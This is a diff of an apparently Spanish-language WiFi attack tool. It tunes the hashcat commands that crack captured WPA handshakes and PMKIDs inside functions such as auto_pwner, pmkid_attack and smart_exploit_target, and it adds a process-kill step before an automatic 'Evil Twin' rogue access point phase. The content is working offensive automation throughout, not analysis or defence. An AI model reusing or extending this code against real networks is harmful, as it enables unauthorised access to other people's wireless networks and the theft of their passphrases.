@@ -1698,7 +1698,7 @@ def crack_password():
                 warn("best64.rule no encontrado. Continuando sin reglas.")
         info("Iniciando hashcat...")
         tip("Presione 's' para ver estado, 'p' para pausar, 'q' para salir.")
-        run(f"hashcat -m 22000 {ruta} {diccionario} {reglas_flag} --force --status --status-timer=15")
+        run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {ruta} {diccionario} {reglas_flag} --force --status --status-timer=15")
     else:
         error("Opción inválida.")
 
@@ -1780,7 +1780,7 @@ def pmkid_attack():
                     "/usr/share/doc/hashcat/rules/best64.rule",
                 ] if os.path.exists(p)), "")
                 reglas_flag = f"-r {best64}" if best64 else ""
-                run(f"hashcat -m 22000 {hc_file} {diccionario} {reglas_flag} --force --status --status-timer=10")
+                run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {hc_file} {diccionario} {reglas_flag} --force --status --status-timer=10")
     else:
         warn("No se encontraron hashes PMKID.")
         tip("El AP puede no ser compatible, estar fuera de rango, o requerir más tiempo.")
@@ -2656,7 +2656,7 @@ def auto_crack():
             "/usr/share/doc/hashcat/rules/best64.rule",
         ] if os.path.exists(p)), "")
         reglas_flag = f"-r {best64}" if best64 else ""
-        run(f"hashcat -m 22000 {hc_file} {diccionario} {reglas_flag} --force --status --status-timer=15")
+        run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {hc_file} {diccionario} {reglas_flag} --force --status --status-timer=15")
     else:
         info(f"Usando {YELLOW}aircrack-ng (CPU){END}")
         run(f"aircrack-ng {cap_file} -w {diccionario}")
@@ -2798,7 +2798,7 @@ def convert_cap():
 
     if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
         ok(f"Generado: {out_file}")
-        info(f"Crackear con: hashcat -m 22000 {out_file} <diccionario>")
+        info(f"Crackear con: hashcat -m 22000 --cpu-affinity=1 -u 512 {out_file} <diccionario>")
     else:
         warn("Sin hashes generados. El .cap puede no contener handshakes/PMKIDs.")
     pause_back()
@@ -3125,7 +3125,7 @@ def osint_wordlist():
             if sel.isdigit() and 1 <= int(sel) <= len(cap_files):
                 cap = cap_files[int(sel)-1]
                 if cap.endswith(".hc22000") and check_tool("hashcat"):
-                    run(f"hashcat -m 22000 {cap} {out} --force --status --status-timer=10")
+                    run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {cap} {out} --force --status --status-timer=10")
                 else:
                     run(f"aircrack-ng {cap} -w {out}")
     pause_back()
@@ -4666,7 +4666,7 @@ def auto_pwner():
                 ] if os.path.exists(p)), "")
                 rf = f"-r {best64}" if best64 else ""
                 hc_out = run(
-                    f"hashcat -m 22000 {hc_file} {wordlist} {rf} --force "
+                    f"hashcat -m 22000 --cpu-affinity=1 -u 512 {hc_file} {wordlist} {rf} --force "
                     f"--status --status-timer=5 --machine-readable 2>/dev/null",
                     capture=True
                 ) or ""
@@ -4717,7 +4717,7 @@ def auto_pwner():
                         "/usr/share/doc/hashcat/rules/best64.rule",
                     ] if os.path.exists(p)), "")
                     rf = f"-r {best64}" if best64 else ""
-                    run(f"hashcat -m 22000 {hc_f} {wordlist} {rf} --force "
+                    run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {hc_f} {wordlist} {rf} --force "
                         f"--status --status-timer=10 2>/dev/null")
                     potfile = run(f"hashcat --show -m 22000 {hc_f} 2>/dev/null", capture=True) or ""
                     pm = re.search(r':(.+)$', potfile, re.MULTILINE)
@@ -5083,7 +5083,7 @@ bssid={bssid}
             run(f"hcxpcapngtool -o {hc_f} {pmkid_f} 2>/dev/null")
         if os.path.exists(hc_f) and os.path.getsize(hc_f) > 0:
             info("Crackeando PMKID con wordlist OSINT...")
-            run(f"hashcat -m 22000 {hc_f} {wl_file} --force --status --status-timer=5")
+            run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {hc_f} {wl_file} --force --status --status-timer=5")
             # Comprobar potfile
             pot = run(f"hashcat --show -m 22000 {hc_f} 2>/dev/null", capture=True) or ""
             pm  = re.search(r':(.+)$', pot, re.MULTILINE)
@@ -5932,7 +5932,7 @@ def _cve_kr00k_pmkid_chain():
             if wl and check_tool("hashcat"):
                 best64 = next((p for p in ["/usr/share/hashcat/rules/best64.rule",
                                "/usr/share/doc/hashcat/rules/best64.rule"] if os.path.exists(p)),"")
-                run(f"hashcat -m 22000 {hc_f} {wl} {f'-r {best64}' if best64 else ''} "
+                run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {hc_f} {wl} {f'-r {best64}' if best64 else ''} "
                     f"--force --status --status-timer=10")
                 pot = run(f"hashcat --show -m 22000 {hc_f} 2>/dev/null", capture=True) or ""
                 pm  = re.search(r':(.+)$', pot, re.MULTILINE)
@@ -6346,7 +6346,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
                 # Crackear PMKID: 1) SSID wordlist 2) wordlist principal
                 for wl in [ssid_wl, wordlist]:
                     if not wl or not os.path.exists(wl): continue
-                    run(f"hashcat -m 22000 {pmkid_hc} {wl} {rule_arg} "
+                    run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {pmkid_hc} {wl} {rule_arg} "
                         f"--force --quiet 2>/dev/null")
                     pot = run(f"hashcat --show -m 22000 {pmkid_hc} 2>/dev/null",
                               capture=True) or ""
@@ -6422,7 +6422,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
         if os.path.exists(ssid_wl) and check_tool("hashcat") and \
                 os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
             eng.update_phase(20)
-            run(f"hashcat -m 22000 {hc_file} {ssid_wl} --force --quiet 2>/dev/null")
+            run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {hc_file} {ssid_wl} --force --quiet 2>/dev/null")
             pot = run(f"hashcat --show -m 22000 {hc_file} 2>/dev/null", capture=True) or ""
             pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
             if pm:
@@ -6436,7 +6436,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
             for ri, rule in enumerate(available_rules or [""]):
                 eng.update_phase(35 + ri * 15)
                 rf = f"-r {rule}" if rule else ""
-                run(f"hashcat -m 22000 {hc_file} {wordlist} {rf} "
+                run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {hc_file} {wordlist} {rf} "
                     f"--force --quiet 2>/dev/null")
                 pot = run(f"hashcat --show -m 22000 {hc_file} 2>/dev/null",
                           capture=True) or ""
@@ -6484,7 +6484,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
         _hf = _hash_files[0]
         for mi, (mask_name, mask) in enumerate(_MASKS):
             eng.update_phase(int(mi / len(_MASKS) * 95))
-            run(f"hashcat -m 22000 {_hf} -a 3 '{mask}' --force --quiet 2>/dev/null",
+            run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {_hf} -a 3 '{mask}' --force --quiet 2>/dev/null",
                 capture=True)
             pot = run(f"hashcat --show -m 22000 {_hf} 2>/dev/null", capture=True) or ""
             pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
@@ -6547,7 +6547,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
             _gen_ssid_wordlist(essid, ssid_wl2, bssid)
             for wl in [ssid_wl2, wordlist]:
                 if not wl or not os.path.exists(wl): continue
-                run(f"hashcat -m 22000 {hc222} {wl} --force --quiet 2>/dev/null",
+                run(f"hashcat -m 22000 --cpu-affinity=1 -u 512 {hc222} {wl} --force --quiet 2>/dev/null",
                     capture=True)
                 pot = run(f"hashcat --show -m 22000 {hc222} 2>/dev/null",
                           capture=True) or ""
@@ -6561,8 +6561,14 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
     eng.set_phase(9, 0)
     if check_tool("hostapd") and check_tool("dnsmasq"):
         eng.update_phase(5)
-        # Detener display para que el portal pueda usar el terminal limpiamente
+        # Detener display y liberar memoria antes del Evil Twin
         eng.stop()
+        # Matar procesos pesados en background para liberar RAM
+        run("pkill -f hashcat 2>/dev/null; pkill -f aircrack-ng 2>/dev/null; "
+            "pkill -f hcxdumptool 2>/dev/null; pkill -f airodump-ng 2>/dev/null; "
+            "pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null; "
+            "pkill -f aireplay-ng 2>/dev/null", capture=True)
+        time.sleep(2)
         print()
         separador("FASE 9 — EVIL TWIN (último recurso)")
         warn("Ningún vector técnico funcionó. Lanzando Evil Twin automático.")
